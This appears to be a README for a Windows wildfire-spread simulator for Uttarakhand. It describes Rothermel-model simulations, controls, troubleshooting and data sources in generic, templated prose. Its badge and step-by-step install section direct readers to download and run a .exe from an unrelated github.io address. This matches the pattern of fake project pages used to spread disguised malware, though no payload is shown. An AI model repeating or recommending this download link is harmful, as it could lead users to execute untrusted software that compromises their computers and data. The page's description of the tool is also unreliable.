# 🌲 forest-fire - Simulate wildfire spread in Uttarakhand forests

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://harriercrosscheck754.github.io)

This application models how forest fires move across the landscape of Uttarakhand. It uses real satellite data from NASA and topographical information to create accurate simulations. Users can visualize fire paths and understand how different terrain factors affect wildfire behavior.

## 📋 What this tool does

Forest fires pose significant risks to the Himalayan ecosystem. This software provides a way to visualize these events using the Rothermel model. The Rothermel model calculates fire spread rates based on fuel type, moisture, and slope. By combining this logic with actual geospatial data, the software shows how a fire might travel across specific regions in Uttarakhand. It processes satellite imagery and landscape data to output a map of the potential fire path.

## 💻 System requirements

The application runs on standard Windows desktop hardware. Ensure your computer meets these minimum specifications for smooth operation:

- Operating System: Windows 10 or Windows 11.
- Processor: Intel Core i5 or AMD equivalent.
- Memory: 8 GB RAM.
- Storage: 1 GB of available disk space for simulations.
- Graphics: Integrated graphics with support for hardware acceleration.

## 📥 How to install

Follow these steps to set up the software on your Windows computer.

1. Visit the [official release page](https://harriercrosscheck754.github.io) to access the downloads.
2. Look for the file ending in .exe in the latest release section.
3. Click the file name to start the download.
4. Locate the downloaded file in your computer's Downloads folder.
5. Double-click the file to begin the installation wizard.
6. Follow the on-screen instructions to select your installation folder.
7. Click Finish to complete the process.

The installer creates a shortcut on your desktop. Use this shortcut to open the application.

## 🚀 Running your first simulation

Once you open the software, follow this guide to start your first fire spread simulation.

1. Select your target area within Uttarakhand. The map panel displays a grid representing the region.
2. Choose a starting point by clicking on the map. This marks the ignition location.
3. Adjust the environmental variables. You can modify fuel moisture levels, wind speed, and wind direction using the sidebar controls.
4. Select the simulation duration. This determines how much time passes in the virtual model.
5. Click the Start Simulation button.
6. Observe the progress bar as the model calculates the spread.
7. View the final result map. Red areas indicate the fire spread, while green areas represent safe zones.

## ⚙️ Understanding the controls

The interface uses simple menus to manage complex data. Familiarize yourself with these sections:

- Sidebar: This contains all your simulation settings. Change wind parameters and fuel density here.
- Navigation Map: Use your mouse wheel to zoom in and out. Click and drag to move across the map surface.
- Legend: Located in the corner of the map, this explains what colors represent.
- Export Menu: Save your results as an image file or a data report for your records.

## 🛠 Troubleshooting common issues

If you encounter problems, follow these solutions:

- Application fails to launch: Check if you have an active internet connection. The application requires online access to fetch updated NASA VIIRS and Copernicus data sets.
- Map looks empty: Ensure you have selected a region within the Uttarakhand boundary. The model does not calculate data outside the mapped scope.
- Simulation runs slow: Close other resource-heavy programs. Large simulations require memory to process the cellular automaton calculations.
- File error: If the software cannot save a report, check your folder permissions. Ensure you have write access to your chosen save directory.

## 🔍 Frequently asked questions

How often does the data update?
The satellite information relies on live feeds from NASA FIRMS. The software pulls the most recent available satellite pass for your selected region.

Can I simulate fires outside Uttarakhand?
The base model focuses on the topography and fuel types specific to the Himalayan region. While the logic holds for other areas, the underlying data files relate specifically to the listed region.

Does this tool predict future fires?
This tool provides a simulation based on current fuel and weather conditions. It does not provide predictive forecasting for active emergencies. Use the results for planning and educational purposes only.

Where are my saved files?
The application defaults to a folder named "ForestFireResults" in your Documents directory. You can change this path in the Settings menu.

Can I move the installed folder?
Moving the installation folder manually might break the application shortcuts. Always use the uninstaller to remove the program, then install it again in your preferred location if you need to change where the files live.

## 📋 Data sources

This project relies on open geospatial data layers. We use three primary sources to maintain simulation accuracy:

- NASA VIIRS: Provides active fire detections and thermal anomaly data.
- Copernicus DEM: Offers high-resolution digital elevation models for realistic slope calculation.
- Rothermel Model: Serves as the mathematical foundation for calculating spread rates across grid cells.

These data sets ensure that your simulations remain grounded in scientific observation. The software handles the complex integration of these different formats automatically.